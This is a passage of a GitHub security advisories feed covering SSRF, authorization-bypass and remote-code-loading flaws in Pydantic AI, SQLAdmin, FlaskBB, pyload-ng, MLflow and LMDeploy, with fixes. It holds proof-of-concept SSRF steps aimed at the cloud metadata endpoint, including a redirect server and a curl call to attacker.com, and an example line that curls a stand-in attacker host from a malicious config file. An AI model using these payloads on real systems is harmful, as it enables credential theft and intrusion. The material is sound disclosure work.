<li><a href="https://github.com/advisories/GHSA-g6ww-w5j2-r7x3">https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T21:52:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai-slim] Pydantic AI: SSRF cloud-metadata blocklist bypass via IPv4-mapped IPv6 (Incomplete fix of CVE-2026-25580)]]></title>
        <id>https://github.com/advisories/GHSA-cqp8-fcvh-x7r3</id>
        <link href="https://github.com/advisories/GHSA-cqp8-fcvh-x7r3"/>
        <updated>2026-05-21T21:35:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application using Pydantic AI opts a URL into <code>force_download='allow-local'</code> (which disables the default block on private/internal IPs), the cloud-metadata blocklist could be bypassed by encoding the metadata IP in an IPv6 transition form (IPv4-mapped IPv6, 6to4, or NAT64). Dual-stack and translated networks route the IPv6 wrapper to the underlying IPv4 endpoint, exposing cloud IAM short-term credentials.</p>
<p>This is an incomplete fix of <a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3">GHSA-2jrp-274c-jhv3</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25580">CVE-2026-25580</a>. The parent advisory's remediation guaranteed that "cloud metadata endpoints are always blocked, even with <code>allow-local</code>." That guarantee did not hold for IPv6-encoded forms of the metadata IPs.</p>
<h2 id="severity">Severity</h2>
<p>Same impact metrics as the parent CVE, but materially narrower attack surface (AC:H instead of AC:L), because exploitation requires the application to have opted into <code>allow-local</code> on a URL influenced by untrusted input.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>Applications are affected <strong>only if</strong> they explicitly opt for <code>FileUrl</code> (<code>ImageUrl</code>, <code>AudioUrl</code>, <code>VideoUrl</code>, <code>DocumentUrl</code>) into <code>force_download='allow-local'</code> on a URL that is, or could be, influenced by untrusted input.</p>
<p>Applications are <strong>not</strong> affected if they use any of the bundled integrations to ingest user input, because they do not propagate <code>force_download</code> from external data:</p>
<ul>
<li><code>Agent.to_web</code> / <code>clai web</code></li>
<li><code>VercelAIAdapter</code></li>
<li><code>AGUIAdapter</code> / <code>Agent.to_ag_ui</code></li>
</ul>
<p>Applications that only download from developer-controlled URLs are not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>1.99.0</code> or later. The cloud-metadata and private-IP blocklists now apply to IPv6 transition forms that route to a blocked IPv4 endpoint (IPv4-mapped IPv6, 6to4, and NAT64 well-known prefix). The blocklists have also been extended to cover additional IANA-reserved IPv4 and IPv6 special-purpose ranges.</p>
<h2 id="workaround-for-unpatched-versions">Workaround for Unpatched Versions</h2>
<p>Avoid passing <code>force_download='allow-local'</code> on any URL that could be influenced by untrusted input. If developers must, resolve the hostname themselves and validate the result against their own metadata blocklist — including IPv6-encoded forms — before constructing the <code>FileUrl</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by <a href="mailto:dohyun4466@gmail.com">j0hndo</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3</a></li>
<li><a href="https://github.com/advisories/GHSA-cqp8-fcvh-x7r3">https://github.com/advisories/GHSA-cqp8-fcvh-x7r3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqp8-fcvh-x7r3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T21:35:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai] Pydantic AI: SSRF cloud-metadata blocklist bypass via IPv4-mapped IPv6 (Incomplete fix of CVE-2026-25580)]]></title>
        <id>https://github.com/advisories/GHSA-cqp8-fcvh-x7r3</id>
        <link href="https://github.com/advisories/GHSA-cqp8-fcvh-x7r3"/>
        <updated>2026-05-21T21:35:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application using Pydantic AI opts a URL into <code>force_download='allow-local'</code> (which disables the default block on private/internal IPs), the cloud-metadata blocklist could be bypassed by encoding the metadata IP in an IPv6 transition form (IPv4-mapped IPv6, 6to4, or NAT64). Dual-stack and translated networks route the IPv6 wrapper to the underlying IPv4 endpoint, exposing cloud IAM short-term credentials.</p>
<p>This is an incomplete fix of <a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3">GHSA-2jrp-274c-jhv3</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25580">CVE-2026-25580</a>. The parent advisory's remediation guaranteed that "cloud metadata endpoints are always blocked, even with <code>allow-local</code>." That guarantee did not hold for IPv6-encoded forms of the metadata IPs.</p>
<h2 id="severity">Severity</h2>
<p>Same impact metrics as the parent CVE, but materially narrower attack surface (AC:H instead of AC:L), because exploitation requires the application to have opted into <code>allow-local</code> on a URL influenced by untrusted input.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>Applications are affected <strong>only if</strong> they explicitly opt for <code>FileUrl</code> (<code>ImageUrl</code>, <code>AudioUrl</code>, <code>VideoUrl</code>, <code>DocumentUrl</code>) into <code>force_download='allow-local'</code> on a URL that is, or could be, influenced by untrusted input.</p>
<p>Applications are <strong>not</strong> affected if they use any of the bundled integrations to ingest user input, because they do not propagate <code>force_download</code> from external data:</p>
<ul>
<li><code>Agent.to_web</code> / <code>clai web</code></li>
<li><code>VercelAIAdapter</code></li>
<li><code>AGUIAdapter</code> / <code>Agent.to_ag_ui</code></li>
</ul>
<p>Applications that only download from developer-controlled URLs are not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>1.99.0</code> or later. The cloud-metadata and private-IP blocklists now apply to IPv6 transition forms that route to a blocked IPv4 endpoint (IPv4-mapped IPv6, 6to4, and NAT64 well-known prefix). The blocklists have also been extended to cover additional IANA-reserved IPv4 and IPv6 special-purpose ranges.</p>
<h2 id="workaround-for-unpatched-versions">Workaround for Unpatched Versions</h2>
<p>Avoid passing <code>force_download='allow-local'</code> on any URL that could be influenced by untrusted input. If developers must, resolve the hostname themselves and validate the result against their own metadata blocklist — including IPv6-encoded forms — before constructing the <code>FileUrl</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by <a href="mailto:dohyun4466@gmail.com">j0hndo</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3</a></li>
<li><a href="https://github.com/advisories/GHSA-cqp8-fcvh-x7r3">https://github.com/advisories/GHSA-cqp8-fcvh-x7r3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqp8-fcvh-x7r3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T21:35:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sqladmin] SQLAdmin: Authorization Bypass on `ajax_lookup`]]></title>
        <id>https://github.com/advisories/GHSA-54mc-gghv-4cfj</id>
        <link href="https://github.com/advisories/GHSA-54mc-gghv-4cfj"/>
        <updated>2026-05-21T21:31:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>ajax_lookup</code> endpoint in <code>application.py</code> bypasses the <code>is_accessible()</code> access control check that all other endpoints enforce.</p>
<p>If a developer restricts model access by overriding <code>is_accessible()</code>, an authenticated user can still query that model's data through the <code>ajax_lookup</code> endpoint — silently bypassing the restriction.</p>
<p><strong>Affected endpoint:</strong></p>
<p><code>GET /{identity}/ajax/lookup?name=&lt;field&gt;&amp;term=&lt;query&gt;</code></p>
<p><strong>All other endpoints enforce both checks:</strong></p>
<table>
<thead>
<tr>
<th>Endpoint</th>
<th><code>@login_required</code></th>
<th><code>is_accessible()</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>list</code></td>
<td>✓</td>
<td>✓</td>
</tr>
<tr>
<td><code>create</code></td>
<td>✓</td>
<td>✓</td>
</tr>
<tr>
<td><code>edit</code></td>
<td>✓</td>
<td>✓</td>
</tr>
<tr>
<td><code>delete</code></td>
<td>✓</td>
<td>✓</td>
</tr>
<tr>
<td><code>details</code></td>
<td>✓</td>
<td>✓</td>
</tr>
<tr>
<td><code>export</code></td>
<td>✓</td>
<td>✓</td>
</tr>
<tr>
<td><code>ajax_lookup</code> (before fix)</td>
<td>✗</td>
<td>✗</td>
</tr>
<tr>
<td><code>ajax_lookup</code> (after fix)</td>
<td>✓</td>
<td>✓</td>
</tr>
</tbody></table>
<p>Note: before this fix, <code>ajax_lookup</code> also lacked the <code>@login_required</code> decorator — unauthenticated users could query it directly. That was addressed in #1035. This report covers the remaining gap: authenticated but unauthorized users.</p>
<h3 id="patches">Patches</h3>
<p>Two changes were made to <code>ajax_lookup</code>:</p>
<ol>
<li>Replaced the hand-rolled authentication check added in #1035 with the standard <code>@login_required</code> decorator used by all other endpoints.</li>
<li>Added the missing <code>is_accessible(request)</code> check, raising <code>HTTP 403</code> when it returns <code>False</code>.</li>
</ol>
<h3 id="workarounds">Workarounds</h3>
<p>None. Developers relying on <code>is_accessible()</code> to restrict model visibility are exposed regardless of what other access controls are in place.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/smithyhq/sqladmin/security/advisories/GHSA-54mc-gghv-4cfj">https://github.com/smithyhq/sqladmin/security/advisories/GHSA-54mc-gghv-4cfj</a></li>
<li><a href="https://github.com/smithyhq/sqladmin/pull/1035">https://github.com/smithyhq/sqladmin/pull/1035</a></li>
<li><a href="https://github.com/advisories/GHSA-54mc-gghv-4cfj">https://github.com/advisories/GHSA-54mc-gghv-4cfj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54mc-gghv-4cfj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T21:31:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flaskbb] FlaskBB: SSRF in get_image_info() via unrestricted avatar URL]]></title>
        <id>https://github.com/advisories/GHSA-xq32-9g7q-7297</id>
        <link href="https://github.com/advisories/GHSA-xq32-9g7q-7297"/>
        <updated>2026-05-21T20:42:10.000Z</updated>
        <content type="html"><![CDATA[<p>###Summary
A Server-Side Request Forgery (SSRF) vulnerability in get_image_info() allows any authenticated user to force the server to send HTTP requests to arbitrary internal endpoints, including cloud metadata services (e.g., AWS 169.254.169.254). This is a blind SSRF with confirmed internal port scanning and internal API triggering capabilities. CVSS 6.5 Medium.</p>
<p>###Details
In flaskbb/utils/helpers.py (line 571), the url parameter is passed directly to requests.get(url, stream=True) without any validation of scheme, host, or IP address.</p>
<pre><code>python# flaskbb/utils/helpers.py:571
def get_image_info(url: str):
    r = requests.get(url, timeout=(3.05, 27), stream=True)
</code></pre>
<p>Attack chain:</p>
<pre><code>POST /user/settings/user-details (avatar URL)
→ ValidateAvatarURL.validate()    # validators.py:103
→ check_image(avatar)             # helpers.py:628
→ get_image_info(url)             # helpers.py:571
→ requests.get(url)               # No domain/IP restriction
Entry points:

/user/settings/user-details (any authenticated user)
/admin/users/&lt;id&gt;/edit (admin only)
</code></pre>
<p>###PoC
<a href="https://github.com/user-attachments/files/26301527/submit.zip">submit.zip</a></p>
<p>Log in to FlaskBB as any user
Navigate to Settings → User Details
Enter <a href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a> as the avatar URL
Submit the form
The server sends a GET request to the internal metadata endpoint</p>
<p>Three exploitation channels confirmed:</p>
<p>Server-side request: Captured on mock metadata server
Internal port scan: check_image() returns distinct errors (CONN_REFUSED, NO_CONTENT_LENGTH, TYPE_NOT_ALLOWED, SUCCESS) that map internal network topology
Internal API triggering: Mock APIs on 127.0.0.1:9200 triggered via SSRF (deploy, shutdown, key dump endpoints)</p>
<p>###Impact
Any authenticated user is impacted. Attackers can force the server to request internal services, cloud metadata endpoints, or private network resources. On cloud deployments (AWS/GCP/Azure), IAM credentials can be leaked. In production, any GET-triggered internal service is reachable: CI/CD webhooks, Elasticsearch, etcd, Consul, etc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/flaskbb/flaskbb/security/advisories/GHSA-xq32-9g7q-7297">https://github.com/flaskbb/flaskbb/security/advisories/GHSA-xq32-9g7q-7297</a></li>
<li><a href="https://github.com/advisories/GHSA-xq32-9g7q-7297">https://github.com/advisories/GHSA-xq32-9g7q-7297</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xq32-9g7q-7297</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:42:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyload-ng: SSRF via HTTP Redirect Bypass in parse_urls API]]></title>
        <id>https://github.com/advisories/GHSA-8rp3-xc6w-5qp5</id>
        <link href="https://github.com/advisories/GHSA-8rp3-xc6w-5qp5"/>
        <updated>2026-05-21T19:54:33.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The SSRF mitigation added in commit <code>33c55da</code> for GHSA-7gvf-3w72-p2pg is incomplete. The <code>PREREQFUNCTION</code>-based private IP check was correctly applied to <code>HTTPChunk</code> (download path) but not to <code>HTTPRequest</code> (used by the <code>parse_urls</code> API). An authenticated attacker can supply a URL pointing to an attacker-controlled server that responds with a 302 redirect to an internal/private IP address, bypassing the <code>is_global_host()</code> check on the initial URL.</p>
<h2 id="details">Details</h2>
<p>The <code>parse_urls</code> API method validates the initial URL hostname:</p>
<pre><code class="language-python"># src/pyload/core/api/__init__.py:600-604
if url:
    urlp = urlparse(url)
    hostname = urlp.hostname
    if urlp.scheme in ("http", "https") and hostname and is_global_host(hostname):
        page = get_url(url)
</code></pre>
<p><code>get_url()</code> is imported from <code>request_factory.py</code> and creates an <code>HTTPRequest</code> with default settings:</p>
<pre><code class="language-python"># src/pyload/core/network/request_factory.py:58-64
def get_url(self, *args, **kwargs):
    with HTTPRequest(None, self.get_options()) as h:
        rep = h.load(*args, **kwargs)
    return rep
</code></pre>
<p><code>HTTPRequest.__init__</code> sets <code>allow_private_ip = True</code> by default:</p>
<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:75
self.allow_private_ip = True
</code></pre>
<p>The <code>init_handle()</code> method enables redirect following:</p>
<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:117-118
self.c.setopt(pycurl.FOLLOWLOCATION, 1)
self.c.setopt(pycurl.MAXREDIRS, 10)
</code></pre>
<p>The <code>_pre_request_callback</code> that should block redirects to private IPs is a no-op when <code>allow_private_ip</code> is <code>True</code>:</p>
<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:574-582
def _pre_request_callback(self, conn_primary_ip, conn_local_ip, conn_primary_port, conn_local_port):
    if not self.allow_private_ip and not is_global_address(conn_primary_ip):
        return pycurl.PREREQFUNC_ABORT
    return pycurl.PREREQFUNC_OK
</code></pre>
<p>The fix at commit <code>33c55da</code> correctly set <code>allow_private_ip = False</code> in <code>HTTPChunk</code> (http_chunk.py:136) for the download path, but <code>HTTPRequest</code> used by <code>RequestFactory.get_url()</code> retains the default of <code>True</code>, leaving the <code>parse_urls</code> API unprotected against redirect-based SSRF.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Step 1: Start a redirect server on attacker-controlled host
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()
HTTPServer(('0.0.0.0', 8888), H).serve_forever()
"

# Step 2: Authenticated user with ADD permission calls parse_urls
curl -X POST 'http://pyload-host:8000/api/parse_urls' \
  -H 'Cookie: session=&lt;valid_session&gt;' \
  -d 'url=http://attacker.com:8888/redirect'

# Expected flow:
# 1. is_global_host('attacker.com') -&gt; True (passes validation)
# 2. get_url() creates HTTPRequest with allow_private_ip=True
# 3. pycurl fetches attacker.com:8888, receives 302 -&gt; http://169.254.169.254/latest/meta-data/
# 4. _pre_request_callback runs but skips check (allow_private_ip=True)
# 5. pycurl follows redirect to cloud metadata endpoint
# 6. Response body parsed by RE_URLMATCH, any URLs in metadata returned to attacker
</code></pre>
<h2 id="impact">Impact</h2>
<p>An authenticated attacker with ADD permission can perform SSRF against:</p>
<ul>
<li><strong>Cloud metadata endpoints</strong> (AWS IMDSv1 at <code>169.254.169.254</code>, GCP, Azure) — potentially leaking IAM credentials, instance metadata, and secrets</li>
<li><strong>Internal services</strong> on private networks (e.g., <code>10.x.x.x</code>, <code>172.16.x.x</code>, <code>192.168.x.x</code>)</li>
<li><strong>Localhost services</strong> (<code>127.0.0.1</code>) running on the pyload server</li>
</ul>
<p>Data exfiltration is partially limited by the <code>RE_URLMATCH</code> regex filter (only URL-like strings from the response body are returned), but cloud metadata responses often contain URLs or URL-like paths that match this pattern. The <code>REDIR_PROTOCOLS</code> setting limits redirects to HTTP/HTTPS only.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Set <code>allow_private_ip = False</code> in <code>RequestFactory.get_url()</code>:</p>
<pre><code class="language-python"># src/pyload/core/network/request_factory.py
def get_url(self, *args, **kwargs):
    with HTTPRequest(None, self.get_options()) as h:
        h.allow_private_ip = False  # Prevent SSRF via redirects
        rep = h.load(*args, **kwargs)
    return rep
</code></pre>
<p>Alternatively, change the default in <code>HTTPRequest.__init__</code> to <code>False</code>:</p>
<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:75
self.allow_private_ip = False
</code></pre>
<p>The second approach is more defensive (secure by default), but may require auditing other callers that legitimately need to access private IPs. The first approach is the targeted fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-8rp3-xc6w-5qp5">https://github.com/pyload/pyload/security/advisories/GHSA-8rp3-xc6w-5qp5</a></li>
<li><a href="https://github.com/advisories/GHSA-8rp3-xc6w-5qp5">https://github.com/advisories/GHSA-8rp3-xc6w-5qp5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8rp3-xc6w-5qp5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T19:54:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow: unauthenticated access to certain FastAPI routes]]></title>
        <id>https://github.com/advisories/GHSA-75cm-x2w3-8mgf</id>
        <link href="https://github.com/advisories/GHSA-75cm-x2w3-8mgf"/>
        <updated>2026-05-21T19:35:52.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in mlflow/mlflow versions 3.9.0 and earlier allows unauthenticated access to certain FastAPI routes when the server is started with authentication enabled (<code>--app-name basic-auth</code>) and served via uvicorn (ASGI). The FastAPI permission middleware only enforces authentication on <code>/gateway/</code> routes, leaving other routes such as the Job API (<code>/ajax-api/3.0/jobs/*</code>) and the OpenTelemetry trace ingestion API (<code>/v1/traces</code>) unprotected. This allows unauthenticated remote attackers to submit jobs, read job results, cancel running jobs, and inject arbitrary trace data into experiments. The issue arises from an architectural mismatch between Flask and FastAPI authentication mechanisms, where the <code>_find_fastapi_validator()</code> function fails to handle non-<code>/gateway/</code> paths, resulting in a complete authentication bypass. This vulnerability is fixed in version 3.10.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2652">https://nvd.nist.gov/vuln/detail/CVE-2026-2652</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/bb62e773263c14e9ba4d1a82fe72d0de2442c6aa">https://github.com/mlflow/mlflow/commit/bb62e773263c14e9ba4d1a82fe72d0de2442c6aa</a></li>
<li><a href="https://huntr.com/bounties/5aeff5f0-49c7-4180-b5cb-c9a046f16756">https://huntr.com/bounties/5aeff5f0-49c7-4180-b5cb-c9a046f16756</a></li>
<li><a href="https://github.com/advisories/GHSA-75cm-x2w3-8mgf">https://github.com/advisories/GHSA-75cm-x2w3-8mgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75cm-x2w3-8mgf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-15T03:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] lmdeploy: Hardcoded trust_remote_code=True is an implicit unsafe remote-code load path with no user opt-out]]></title>
        <id>https://github.com/advisories/GHSA-9xq9-36w5-q796</id>
        <link href="https://github.com/advisories/GHSA-9xq9-36w5-q796"/>
        <updated>2026-05-21T19:33:33.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<h2 id="📋-reframing-2026-05-02-implicit-unsafe-remote-code-path-not-supply-chain">📋 Reframing (2026-05-02): implicit unsafe remote-code path, not "supply-chain"</h2>
<p>The accurate description of this vulnerability is:
<strong>"<code>get_model_arch</code> and related helpers hardcode <code>trust_remote_code=True</code>
with no opt-out, creating an implicit unsafe remote-code load path
on every model fetch."</strong></p>
<p>What this report does NOT claim:</p>
<ul>
<li>It is NOT a network-attack RCE — the user supplies the model
reference; LMDeploy honors it.</li>
<li>It is NOT a "supply chain" CVE in the classical sense (where a
benign upstream is compromised) — the user explicitly types the
repo name.</li>
</ul>
<p>What this report DOES claim:</p>
<ul>
<li>Other inference frameworks (vLLM, TGI, Hugging Face transformers
itself) all expose <code>--trust-remote-code</code> as <strong>opt-in</strong> so that
users who consciously load known-safe repos can opt in, while
users following a tutorial cannot accidentally execute attacker
Python by typing a wrong repo name.</li>
<li>LMDeploy's hardcoded True is an <strong>implicit</strong> trust-boundary
override that violates HF Transformers' default-secure stance
(<code>trust_remote_code=False</code> since transformers ≥ 4.30).</li>
<li>The fix is a one-line CLI flag (<code>--trust-remote-code</code>) defaulting
False, threaded through the three sites, matching the rest of
the ecosystem.</li>
</ul>
<p>Severity should be assessed as <strong>hardening / safe-by-default</strong>,
not as full unauthenticated RCE. CVSS revised to <strong>5.5 Medium</strong>
(<code>AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> × user-must-load qualifier).</p>
<p>Runtime evidence: see <code>12_lmdeploy_trust_remote_code_F13/runtime_evidence/cloudrun_cpu_verdict.txt</code>.</p>
</blockquote>
<hr>
<h1 id="f13--lmdeploy-hardcoded-trust_remote_codetrue-enables-hf-supply-chain-rce-without-user-opt-in">F13 — LMDeploy: hardcoded <code>trust_remote_code=True</code> enables HF supply-chain RCE without user opt-in</h1>
<p><strong>Reporter:</strong> ibondarenko1 / <a href="mailto:sactransport2000@gmail.com">sactransport2000@gmail.com</a>
<strong>Coordinated-disclosure window:</strong> 90 days from initial vendor email.</p>
<h2 id="tldr">TL;DR</h2>
<p>LMDeploy unilaterally passes <code>trust_remote_code=True</code> to
<code>transformers.AutoConfig.from_pretrained()</code> (and several other
<code>from_pretrained</code> callers) <strong>regardless of any user opt-in</strong>. The
flag is hardcoded <code>True</code> in source — there is no CLI flag, no
environment variable, no parameter, and no warning that lets a
user refuse remote code execution from the model repository.
This is a <strong>silent override of HuggingFace Transformers' own
default-secure stance</strong> (<code>trust_remote_code=False</code>) introduced
in HF Transformers ≥ 4.30 specifically to prevent this class of
supply-chain RCE.</p>
<p>The user running <code>lmdeploy serve api_server &lt;attacker_repo&gt;</code>,
<code>lmdeploy lite calibrate &lt;attacker_repo&gt;</code>, etc. has <strong>no way to
opt out</strong>. The only escape hatch is for the user to never load
any third-party HF repo with LMDeploy — which is incompatible
with LMDeploy's documented use case.</p>
<p>HuggingFace's <code>trust_remote_code=False</code> default exists exactly to
prevent silent RCE when loading a third-party repo. LMDeploy overrides
this default, restoring the unsafe behaviour transparently. A malicious
HF repo with a <code>configuration_*.py</code> shim runs Python code as the
LMDeploy user at the very first call to <code>get_model_arch(...)</code>.</p>
<p>This is a documented anti-pattern (see HF Hub docs:
"Trusting custom code is therefore tricky..."). Multiple peer
projects fixed similar issues — e.g. Hugging Face Transformers
itself made this opt-in by default, and <code>vllm</code> exposes the flag
through <code>--trust-remote-code</code> rather than hardcoding it.</p>
<h2 id="affected-version">Affected version</h2>
<ul>
<li>Repository: <code>github.com/InternLM/lmdeploy</code>, branch <code>main</code>.</li>
<li>Branch SHA at audit time: <code>9df0eff7c38ae69b9d4b9f7ad1441e484d439f92</code>
(2026-05-02).</li>
<li>Pinned blob SHAs:<ul>
<li><code>lmdeploy/archs.py</code> → <code>68fa03a407734be1e2ae04098d34e9acdbe98262</code></li>
<li><code>lmdeploy/lite/apis/calibrate.py</code> →
<code>0728304bdc3c03eee1d790bfbd5496df080a0ecd</code></li>
<li><code>lmdeploy/lite/utils/load.py</code> →
<code>7c61677aa01e2d9881e32f8ca8ef6ad0f1d8b120</code></li>
<li><code>lmdeploy/pytorch/check_env/model.py</code> →
<code>b1a2daaa426bf5fe25030f7913c703eed9f5b261</code></li>
</ul>
</li>
</ul>
<p>Snapshots of all four files are in <code>source_pinned/</code>.</p>
<h2 id="source-level-evidence">Source-level evidence</h2>
<h3 id="site-1--architecture-detection-every-load-goes-through-here">Site 1 — architecture detection (every load goes through here)</h3>
<p><code>lmdeploy/archs.py:147-157</code> — <code>get_model_arch</code>:</p>
<pre><code class="language-python">def get_model_arch(model_path: str):
    """Get a model's architecture and configuration."""
    try:
        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=True)
    except Exception as e:  # noqa
        from transformers import PretrainedConfig
        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=True)
</code></pre>
<p><strong>Both</strong> the primary path and the fallback hardcode
<code>trust_remote_code=True</code>. There is no parameter to override it. This
function is called from every model-loading path in lmdeploy.</p>
<h3 id="site-2--quantization-cli">Site 2 — quantization CLI</h3>
<p><code>lmdeploy/lite/apis/calibrate.py:248-251</code>:</p>
<pre><code class="language-python">tokenizer = AutoTokenizer.from_pretrained(model, trust_remote_code=True)
...
model = load_hf_from_pretrained(model, dtype=dtype, trust_remote_code=True)
</code></pre>
<p><code>lmdeploy lite calibrate &lt;repo&gt;</code> and downstream quant CLIs (gptq,
awq) all flow through this. Hardcoded.</p>
<h3 id="site-3--calibration-helper">Site 3 — calibration helper</h3>
<p><code>lmdeploy/lite/utils/load.py:55</code>:</p>
<pre><code class="language-python">def load_hf_from_pretrained(pretrained_model_name_or_path, dtype, **kwargs):
    ...
    hf_config = AutoConfig.from_pretrained(pretrained_model_name_or_path, trust_remote_code=True)
</code></pre>
<p>Even if the caller does not pass <code>trust_remote_code=True</code> in
<code>**kwargs</code>, the helper internally hardcodes it on the config call
(line 55), then loads the model on line 74. The config call alone is
sufficient for RCE: HF Transformers downloads <code>configuration_*.py</code>
from the repo and <code>import</code>s it whenever <code>trust_remote_code=True</code>.</p>
<h3 id="site-4--pytorch-engine-check">Site 4 — pytorch engine check</h3>
<p><code>lmdeploy/pytorch/check_env/model.py:10,99,234,242</code> —
<code>trust_remote_code: bool = True</code> is the default value for the engine's
parameter. Unlike the three sites above, this is "default true" not
"hardcoded true" — a determined caller can pass False — but every
shipped CLI passes True or relies on the default.</p>
<h3 id="what-trust_remote_codetrue-actually-enables">What <code>trust_remote_code=True</code> actually enables</h3>
<p>When <code>AutoConfig.from_pretrained(repo, trust_remote_code=True)</code> is
called and the repo's <code>config.json</code> contains an <code>auto_map</code> key
pointing to a custom <code>configuration_&lt;name&gt;.py</code>:</p>
<ol>
<li>HF Transformers downloads the <code>.py</code> file from the repo.</li>
<li>HF imports the module via <code>importlib</code>, <strong>executing the file's
top-level code</strong> (any <code>print</code>, <code>os.system</code>, <code>subprocess.run</code>,
<code>urllib.request.urlopen</code>, etc. fires now).</li>
<li>HF then instantiates the named class.</li>
</ol>
<p>So a malicious repo only needs a top-level
<code>os.system("curl https://attacker/?$(whoami)")</code> in
<code>configuration_evil.py</code>. It runs as the lmdeploy process user.</p>
<h2 id="threat-model">Threat model</h2>
<p><strong>Attack surface.</strong> Any user who runs an lmdeploy CLI command against
a HuggingFace repo identifier they did not personally vet. This
includes:</p>
<ul>
<li>Casual users following a tutorial that says
<code>lmdeploy serve api_server &lt;some_repo&gt;</code>.</li>
<li>CI pipelines that automatically pull a model from HF Hub by
configuration (e.g. updates to a non-Pinned version tag).</li>
<li>Researchers comparing models from many authors. Even running
<code>lmdeploy lite calibrate</code> for benchmarking is enough.</li>
</ul>
<p>The user is <strong>not warned</strong> that arbitrary Python from the repo will
execute, and there is <strong>no flag</strong> to disable it. The CVE class is
CWE-94 (Improper Control of Generation of Code, supply-chain
flavour) and CWE-915 (Improperly Controlled Modification of
Dynamically-Determined Object Attributes).</p>
<h2 id="comparison-to-peer-projects">Comparison to peer projects</h2>
<table>
<thead>
<tr>
